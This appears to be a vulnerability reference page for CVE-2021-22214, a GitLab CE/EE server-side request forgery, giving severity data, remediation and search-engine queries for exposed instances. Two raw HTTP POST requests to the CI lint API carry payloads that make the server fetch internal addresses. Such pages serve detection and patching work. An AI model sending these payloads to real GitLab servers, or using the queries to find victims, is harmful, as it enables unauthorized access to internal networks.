---
layout: post
cve_id: CVE-2021-22214
title: Gitlab CE/EE 10.5 - Server-Side Request Forgery
pcap: true
pcap_path: /pcaps/2021/CVE-2021-22214.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-22214.yaml
snort2_rule: N/A
snort3_rule: N/A
author: Suman_Kar,GitLab Red Team
severity: high
impact: 'Successful exploitation of this vulnerability can lead to unauthorized access
  to internal resources, potential data leakage, and further attacks on the system.

  '
remediation: 'Upgrade Gitlab CE/EE to a version that is not affected by the vulnerability
  (10.6 or higher).

  '
reference:
- https://nvd.nist.gov/vuln/detail/CVE-2021-22214
- https://nvd.nist.gov/vuln/detail/CVE-2021-39935
- https://nvd.nist.gov/vuln/detail/CVE-2021-22175
- https://vin01.github.io/piptagole/gitlab/ssrf/security/2021/06/15/gitlab-ssrf.html
- https://docs.gitlab.com/ee/api/lint.html
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
  cvss-score: 8.6
  cve-id: CVE-2021-22214
  cwe-id: CWE-918
  epss-score: 0.9352
  epss-percentile: 0.99814
  cpe: cpe:2.3:a:gitlab:gitlab:*:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: gitlab
  product: gitlab
  shodan-query:
  - http.title:"GitLab"
  - cpe:"cpe:2.3:a:gitlab:gitlab"
  - http.title:"gitlab"
  fofa-query: title="gitlab"
  google-query: intitle:"gitlab"
tags:
- cve2021
- cve
- gitlab
- ssrf
- vkev
- vuln
---

## üîç Vulnerability Description
GitLab CE/EE versions starting from 10.5 are susceptible to a server-side request forgery vulnerability when requests to the internal network for webhooks are enabled, even on a GitLab instance where registration is limited. The same vulnerability actually spans multiple CVEs, due to similar reports that were fixed across separate patches. These CVEs are:
- CVE-2021-39935
- CVE-2021-22214
- CVE-2021-22175


## üåê HTTP Request
```nohighlight
POST /api/v4/ci/lint?include_merged_yaml=true HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Safari/605.1.15
Content-Length: 59
Content-Type: application/json
Accept-Encoding: gzip
Connection: close

{"content":"include:\n  remote: http://127.0.0.1/test.yml"}
```

```nohighlight
POST /api/v4/ci/lint?include_merged_yaml=true HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
Content-Length: 65
Content-Type: application/json
Accept-Encoding: gzip
Connection: close

{"content": "include:\n  remote: http://127.0.0.1:9100/test.yml"}
```

